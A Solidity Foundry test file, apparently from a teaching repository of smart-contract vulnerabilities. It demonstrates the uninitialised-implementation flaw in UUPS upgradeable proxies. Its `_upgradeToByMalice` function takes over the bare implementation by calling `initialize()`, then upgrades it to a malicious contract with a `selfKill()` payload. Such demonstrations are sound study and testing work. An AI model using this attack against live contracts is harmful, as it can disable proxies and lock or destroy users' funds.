// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DemoProxy} from "../../../../src/Vulnerability_upgrade/uups/ImplementWithoutInitialize/DemoProxy.sol";
import {Logic_1, Logic_2} from "../../../../src/Vulnerability_upgrade/uups/ImplementWithoutInitialize/Implements.sol";
import {MaliceContract} from "../../../../src/Vulnerability_upgrade/uups/ImplementWithoutInitialize/MaliceContract.sol";

import {Test, console2} from "forge-std/Test.sol";

contract DemoTest is Test {
    bytes32 constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant _OWNER_SLOT = bytes32(uint256(51));

    Logic_1 logic_1;
    Logic_2 logic_2;
    DemoProxy demoProxy;
    MaliceContract maliceContract;

    address owner = makeAddr("owner");
    address malice = makeAddr("malice");

    function setUp() public {
        vm.startPrank(owner);
        logic_1 = new Logic_1();
        logic_2 = new Logic_2();
        bytes memory initData = abi.encodeWithSignature("initialize()");
        demoProxy = new DemoProxy(address(logic_1), initData);
        vm.stopPrank();
    }

    function _upgradeToByMalice() internal {
        vm.startPrank(malice);

        // attack process
        maliceContract = new MaliceContract();
        logic_1.initialize();
        bytes memory attackData = abi.encodeWithSignature("selfKill()");
        logic_1.upgradeToAndCall(address(maliceContract), attackData);

        vm.stopPrank();
    }

    function _upgradeToByOwner() internal {
        vm.startPrank(owner);
        Logic_1(address(demoProxy)).upgradeTo(address(logic_2));
        vm.stopPrank();
    }

    function test_MaliceContract() public {
        bytes32 imp1 = vm.load(address(demoProxy), _IMPLEMENTATION_SLOT);
        _upgradeToByMalice();
        _upgradeToByOwner();
        bytes32 imp2 = vm.load(address(demoProxy), _IMPLEMENTATION_SLOT);
        Logic_1(address(demoProxy)).setValue(1);
        console2.log(Logic_1(address(demoProxy)).value());
    }
}
